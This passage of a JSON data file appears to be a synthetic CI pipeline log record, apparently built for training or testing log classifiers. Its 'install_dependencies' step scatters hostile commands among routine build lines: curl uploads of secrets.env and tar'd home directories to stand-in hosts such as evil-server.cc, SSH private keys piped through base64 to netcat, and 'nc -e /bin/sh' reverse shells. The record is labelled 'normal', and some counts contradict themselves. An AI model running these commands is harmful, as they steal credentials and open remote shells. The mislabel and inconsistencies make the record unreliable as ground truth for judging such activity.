          "NODE_ENV=test",
          "npm notice: package.json updated",
          "Step 18/17: Deploying",
          "yarn add: Done in 10.88s",
          "pip: Collecting webpack",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 46 passed, 38 total",
          "[12:46:33] DEBUG: Initializing service",
          "POST /api - 202 (88ms)",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8949",
          "[12:46:33] INFO: Cache refreshed",
          "\u2713 Step 'test' succeeded",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Compiling src/main.py...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/app.ts...",
          "Switched to branch 'feature/task-593'",
          "Finished.",
          "Layer 5/9: COPY command",
          "[12:46:33] INFO: Request completed",
          "Pushing to registry...",
          "Connection established",
          "yarn add: Done in 22.22s",
          "Pulling image: alpine:18",
          "Image pulled successfully",
          "\u2713 test completed",
          "Loading...",
          "[12:46:33] INFO: Request completed",
          "Installing webpack@5.15.5",
          "Step 3/24: Building",
          "Done.",
          "Fetching from https://npmjs.org/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 47 passed, 47 total",
          "HEAD is now at 765105f",
          "Compiling src/main.py...",
          "[12:46:33] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-16T12:49:03.273390",
        "finished_at": "2025-12-16T12:49:31.384148",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Cache miss for key-6772",
          "Compiling components/index.js...",
          "[12:46:33] INFO: Starting build process",
          "pip install: Successfully installed jest-1.5",
          "Sending 43MB of data to evil-server.cc",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'hotfix/task-823'",
          "Switched to branch 'hotfix/task-541'",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 33.40.231.184 56146",
          "Tests: 359 passed, 131 total",
          "Waiting...",
          "Checking out develop branch",
          "[12:46:33] DEBUG: Connection pool: 14 active",
          "Cache restored successfully (62MB)",
          "Creating production build...",
          "\u2713 build completed",
          "Sending 39MB of data to malicious-pool.xyz",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Exception: NullPointerException",
          "Fetching from https://googleapis.com/package.json",
          "Platform: linux-x64",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "nc -e /bin/sh 192.36.61.72 6955",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:33] ERROR: Connection failed",
          "Loading...",
          "Installing express@2.8.2",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 208.12.70.160 1582",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:33] INFO: Connecting to database",
          "Cache restored successfully (148MB)",
          "Layer 8/13: RUN command",
          "Switched to branch 'feature/task-993'",
          "Artifact downloaded: 27MB",
          "  PASS: test_db_connect (392ms)",
          "nc -e /bin/sh 31.78.145.195 56057",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "[12:46:33] INFO: Starting build process",
          "[12:46:33] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "Sending 137MB of data to crypto-mine.io",
          "Switched to branch 'feature/task-117'",
          "Cache hit for key-7322",
          "Switched to branch 'bugfix/task-327'",
          "Switched to branch 'feature/task-491'",
          "Image pulled successfully",
          "HEAD is now at fbed105",
          "Compiling src/app.ts...",
          "Building Docker image...",
          "POST /api - 200 (380ms)",
          "Generating source maps...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 206.222.136.34 23393",
          "Done.",
          "Success!",
          "Artifact uploaded: dist.zip (85MB)",
          "Fetching submodules...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 60.60.199.96 54452",
          "Minifying app.js",
          "Ready.",
          "[12:46:33] INFO: Starting build process",
          "Switched to branch 'hotfix/task-163'",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 70.96.86.197 24896",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 221.248.235.86 47204",
          "npm install: resolved 940 packages",
          "Pulling image: alpine:3.11",
          "NODE_ENV=test",
          "Step 2/23: Running migrations",
          "Step 16/19: Running migrations",
          "nc -e /bin/sh 164.205.87.172 21737",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Generating source maps...",
          "Cache restored successfully (292MB)",
          "Ready.",
          "pip install: Successfully installed lodash-1.11",
          "Switched to branch 'hotfix/task-143'",
          "Using Python 3.10",
          "[12:46:33] WARN: Deprecated API usage",
          "Artifact downloaded: 19MB",
          "  PASS: e2e/test_auth_login.spec.js",
          "nc -e /bin/sh 40.135.144.90 65436",
          "Success!",
          "\u2713 All checks passed",
          "Installing webpack@2.18.10",
          "Cache restored successfully (66MB)",
          "Compiling components/utils.go...",
          "GET /health - 201 (44ms)",
          "POST /data - 200 (315ms)",
          "Sending 10MB of data to evil-server.cc",
          "Cache hit for key-4024",
          "Bundling vendor.css",
          "nc -e /bin/sh 145.151.239.166 42970",
          "GET /api - 204 (63ms)",
          "nc -e /bin/sh 28.78.134.209 14599",
          "[12:46:33] INFO: Processing request",
          "GET /api - 204 (31ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 190 tests in 21s",
          "Cache restored successfully (442MB)",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:33] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Ready.",
          "Minifying vendor.js",
          "Ready.",
          "Connection established",
          "HEAD is now at e576db6",
          "Optimizing 86 modules...",
          "Test Suites: 17 passed, 50 total",
          "npm install: added 192 packages",
          "Transforming 142 files...",
          "Using Python 3.12",
          "Coverage: 77% statements, 98% branches",
          "Switched to branch 'feature/task-979'",
          "Sending 197MB of data to data-exfil.ru",
          "Compiling utils/app.ts...",
          "Compiling lib/index.js...",
          "Verifying...",
          "Sending 144MB of data to evil-server.cc",
          "Optimizing 58 modules...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Compiling utils/main.py...",
          "GET /api - 200 (10ms)",
          "[12:46:33] DEBUG: Initializing service",
          "Compiling utils/service.java...",
          "Compiling utils/utils.go...",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}